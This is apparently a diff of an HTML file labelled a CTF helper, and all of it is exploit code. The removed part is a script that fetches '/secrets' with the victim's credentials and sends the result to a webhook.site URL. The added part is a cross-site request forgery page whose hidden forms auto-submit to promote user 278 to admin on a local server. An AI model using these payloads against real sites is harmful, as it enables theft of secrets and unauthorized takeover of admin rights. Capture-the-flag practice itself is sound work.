@@ -1,5 +1,24 @@
-<script>
-  fetch('/secrets', {credentials: 'include'})
-    .then(r => r.text())
-    .then(t => new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?d=' + encodeURIComponent(t));
-</script>
+<!doctype html>
+<html>
+  <head><meta charset="utf-8"><title>CTF helper</title></head>
+  <body>
+    <form id="f" action="http://127.0.0.1:3000/admin/add" method="post">
+      <input type="hidden" name="userId" value="278" />
+      <input type="hidden" name="role" value="admin" />
+    </form>
+
+    <!-- Try a second variant for a different endpoint -->
+    <form id="f2" action="http://127.0.0.1:3000/user/278/role" method="post">
+      <input type="hidden" name="role" value="admin" />
+    </form>
+
+    <script>
+      // Only browsers run this — but some fetchers will auto-submit forms even without JS.
+      try { document.getElementById('f').submit(); } catch(e) {}
+      try { document.getElementById('f2').submit(); } catch(e) {}
+    </script>
+    <noscript>
+      <p>No script — hope the fetcher posts the form automatically.</p>
+    </noscript>
+  </body>
+</html>
